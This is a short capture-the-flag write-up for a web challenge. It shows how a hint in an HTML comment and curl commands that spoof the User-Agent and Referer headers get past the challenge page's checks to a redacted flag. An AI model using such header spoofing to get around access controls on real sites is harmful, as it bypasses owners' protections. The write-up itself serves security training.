## Question

Try to bypass my security measure on this site! http://165.227.106.113/header.php

## Hint

View source of the web page is useful.


## Solution
Usual recon of the webpage is done such as view sauce, network traffic and cookies. Only an interesting comment was found in the comment section of the HTML with an agent name for the header request to be done with. **Sup3rS3cr3tAg3nt**

Curl is a great tool for transferring data from or to a server. It's also great to manipulate request headers. Manual page of curl can be found here. https://curl.se/docs/manpage.html

A curl request was done to the web page and got a response back as follow.
```console
% curl http://165.227.106.113/header.php
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/7.64.1
<!-- Sup3rS3cr3tAg3nt  -->
```

So the curl command was constructed with a modified User-Agent as below. 
```console
curl -H "User-Agent: Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php 
Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
<!-- Sup3rS3cr3tAg3nt  -->
```

The response above wanted the request traffic to be referred from a site called awesomesauce.com. So the curl command is further constructed to modify the referer in the header reqeust as below.
```console
% curl -e 'awesomesauce.com' -H "User-Agent: Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php
Here is your flag: flag{redacted}
<!-- Sup3rS3cr3tAg3nt  -->
```
## Improvement
